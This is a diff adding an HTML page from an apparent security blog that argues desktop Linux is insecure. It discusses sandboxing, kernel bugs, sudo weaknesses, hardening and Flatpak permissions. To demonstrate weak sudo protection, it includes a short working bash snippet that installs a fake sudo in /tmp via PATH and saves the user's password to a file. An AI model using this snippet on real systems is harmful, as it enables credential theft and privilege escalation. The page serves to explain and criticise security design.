@@ -1,0 +1,111 @@
+<html lang=en>
+
+<head>
+  <meta charset="utf-8">
+  <link rel="stylesheet" type="text/css" href="styles.css">
+  <title>Linux | Madaidan's Insecurities</title>
+</head>
+
+<body>
+  <h1>Linux</h1>
+
+  <p>
+    Due to inevitable pedanticism, "Linux" in this article refers to a standard Linux or GNU/Linux distro.
+  </p>
+
+  <h2>Linux (in)security</h2>
+
+  <p>
+    There is a common assumption that Linux is a very secure operating system. This is very far from the truth for
+    various different reasons. <br>
+    <br>
+    There is no strong sandboxing in the standard desktop. This means all applications have access to each other’s data
+    and can snoop on your personal information. Most programs are written in memory unsafe languages such as C or C++
+    which has been the cause of <a
+      href="https://msrc-blog.microsoft.com/2019/07/16/a-proactive-approach-to-more-secure-code/">the majority of
+      discovered security vulnerabilities</a> and modern exploit mitigations such as Control-Flow Integrity are not
+    widely used. <br>
+    <br>
+    The kernel is also very lacking in security. It is a monolithic kernel written entirely in a memory unsafe language
+    and has hundreds of bugs, many being security vulnerabilities, <a
+      href="https://events19.linuxfoundation.org/wp-content/uploads/2017/11/Syzbot-and-the-Tale-of-Thousand-Kernel-Bugs-Dmitry-Vyukov-Google.pdf">found
+      each <i>month</i></a>. In fact, there are so many bugs being found in the kernel, developers can’t keep up which
+    results in many of the bugs <a href="https://syzkaller.appspot.com/upstream">staying unfixed for a long time</a>.
+    The kernel is also <a href="https://jon.oberheide.org/files/syscan12-exploitinglinux.pdf">decades behind in exploit
+      mitigations</a> and many kernel developers simply <a
+      href="https://www.washingtonpost.com/sf/business/2015/11/05/net-of-insecurity-the-kernel-of-the-argument/">do not
+      care enough</a>. <br>
+    <br>
+    On ordinary desktops, a compromised non-root user account with access to <code>sudo</code> is almost equal to full
+    root compromise as there are too many ways for an attacker to retrieve the sudo password. Usually, the standard user
+    is part of group <code>sudo</code> which makes this a massive issue and makes a sudo password almost security
+    theater. For example, the attacker can exploit the plethora of keylogging opportunities such as <a
+      href="https://theinvisiblethings.blogspot.com/2011/04/linux-security-circus-on-gui-isolation.html">X’s lack of GUI
+      isolation</a>, the <a href="https://www.openwall.com/lists/oss-security/2011/11/05/3">many infoleaks in
+      <code>/proc</code></a>, use <a href="https://github.com/Aishou/wayland-keylogger"><code>LD_PRELOAD</code> to hook
+      into every process</a> and so much more. Even if we mitigate every single way to log keystrokes, the attacker can
+    just setup their own fake sudo program to grab the user password. <br>
+    <br>
+    This is all it takes to get your <code>sudo</code> password:
+    <pre><code>
+cat &lt;&lt;\EOF > /tmp/sudo
+#!/bin/bash
+if [[ "${@}" = "" ]]; then
+  /usr/bin/sudo
+else
+  read -r -p "[sudo] password for user: " password
+  echo "${password}" > /tmp/password
+  echo "Sorry, try again."
+  /usr/bin/sudo ${@}
+fi
+EOF
+chmod +x /tmp/sudo
+export PATH="/tmp:${PATH}"
+    </code></pre>
+    <br>
+    Now the attacker is just a <code>modprobe</code> away from full kernel access.
+  </p>
+
+  <h2>"But I harden my system!"</h2>
+
+  <p>
+    Standard system hardening is not enough to fix any of these massive architectural security issues. Restricting a few
+    minor things is not going to fix this. Likewise, a few common security features distros deploy by default is also
+    not going to fix this. Just because your distro enables a MAC framework without creating a strict policy and still
+    running most processes unconfined, doesn't mean you can escape from these. <br>
+    <br>
+    The hardening required for a reasonably secure Linux distro is far greater than people assume. You will need full
+    system MAC policies, full verified boot (not just the boot chain, the entire base system), a strong sandboxing
+    architecture, a hardened kernel, widespread use of modern exploit mitigations and plenty more. <br>
+    <br>
+    One Linux distro that actually is working on fixing these issues is <a
+      href="https://forums.whonix.org/t/fixing-the-desktop-linux-security-model/9172">Whonix</a>.
+  </p>
+
+  <h3>Flatpak</h3>
+
+  <p>
+    Flatpak aims to sandbox applications but its sandboxing is very flawed. It fully trusts the applications and allows
+    them to specify their own policy. This means security is optional and apps can just choose not to be sufficiently
+    sandboxed. <br>
+    <br>
+    Flatpak's permissions are also far too broad to be meaningful. For example, many applications come with
+    <code>filesystem=home</code> which is read-write access to the user's home directory, giving access to all of your
+    personal files and allowing trivial escapes via writing to <code>~/.bashrc</code> or similar. <br>
+    <br>
+    Another example of Flatpak's broad permissions is how it allows unfiltered access to the X11 socket, allowing easy
+    escapes due to X11's lack of GUI isolation. Adding X11 sandboxing via a nested X11 server such as Xpra is easy but
+    Flatpak developers refuse to acknowledge this and continue to claim <a
+      href="https://blogs.gnome.org/alexl/2015/02/17/first-fully-sandboxed-linux-desktop-app/">"X11 is impossible to
+      secure"</a>. <br>
+    <br>
+    Even more examples of this is how Flatpak gives full access to directories such as <code>/sys</code> or
+    <code>/proc</code> (kernel interfaces known for information leaks).
+  </p>
+  <p class="p-final">
+    <a href="index.html" class="back">Go back</a>
+  </p>
+
+  <button onclick="setDarkMode()" class="dark-mode-toggle">🌓</button>
+  <script type="text/javascript" src="toggle.js"></script>
+</body>
